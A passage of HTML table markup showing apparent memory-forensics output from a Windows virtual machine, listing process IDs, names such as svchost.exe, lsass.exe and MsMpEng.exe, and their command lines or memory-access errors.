class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;lsass.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:299px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>748</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>fontdrvhost.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x1ef2831020 is not valid &#x28;process exited&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:322px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>752</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>fontdrvhost.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x22512c41a28 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:345px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>764</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k DcomLaunch -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:368px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>872</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k RPCSS -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:391px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>956</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>dwm.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>dwm.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:414px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>440</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k netsvcs -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:437px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>420</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k LocalServiceNoNetwork -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:460px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>656</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;svchost.exe -k LocalServiceNetworkRestricted -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:483px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1040</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;svchost.exe -k LocalSystemNetworkRestricted -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:506px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1112</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k LocalService -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:529px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1260</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;svchost.exe -k NetworkService -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:552px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1452</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>MemCompression</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x20 is not valid &#x28;process exited&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:575px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1520</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;svchost.exe -k LocalServiceNetworkRestricted -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:598px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1680</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k appmodel -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:621px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1688</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xb59a32b020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:644px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1696</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x71e9c1e020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:667px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1864</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>spoolsv.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;spoolsv.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:690px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1944</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k LocalServiceNoNetworkFirewall -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:713px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1952</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xad7a360020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:736px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2080</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;svchost.exe -k utcsvc -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:759px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2216</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>wlms.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Process 2216&#x3a; Required memory at 0x184900b10000 is not valid &#x28;incomplete layer memory_layer&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:782px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2232</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>vm3dservice.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x152614c1ae8 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:805px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2248</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>vmtoolsd.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x18f2c40211c is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:828px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2256</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>VGAuthService.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Process 2256&#x3a; Required memory at 0x14848c80000 is not valid &#x28;incomplete layer memory_layer&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:851px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2272</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>MsMpEng.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files&#x5c;Windows Defender&#x5c;MsMpEng.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:874px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2388</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>vm3dservice.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x1e874be1ae8 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:897px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2736</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>dllhost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xaf422cd020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:920px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2828</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>WmiPrvSE.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x1f77fba2104 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:943px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2856</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msdtc.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Process 2856&#x3a; Required memory at 0x8104a8b4000 is not valid &#x28;incomplete layer memory_layer&#x3f;&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:966px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>2956</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div 